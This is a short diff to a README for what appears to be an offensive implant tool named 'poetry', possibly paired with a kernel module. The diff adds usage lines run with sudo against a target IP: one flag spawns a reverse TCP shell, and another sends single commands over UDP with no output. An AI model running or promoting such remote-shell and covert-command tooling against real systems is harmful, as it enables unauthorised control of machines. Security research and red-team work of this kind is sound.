@@ -26,7 +26,8 @@ The compiled binary will be called: `poetry`
 Copy the compiled binary to the host system. Run the following commands to interact with the target:
 ```sh
 export IFACE=<ethernet_interface> # set interface env var
-sudo -E ./poetry -t <target_ip> # -E passes the env vars to sudo
+sudo -E ./poetry -t <target_ip> -s # -s attempts to spawn a reverse tcp shell
+sudo -E ./poetry -t <target_ip> -c <command> # -c sends a single command through udp. no output
 ```
 
 ## Kernel Module
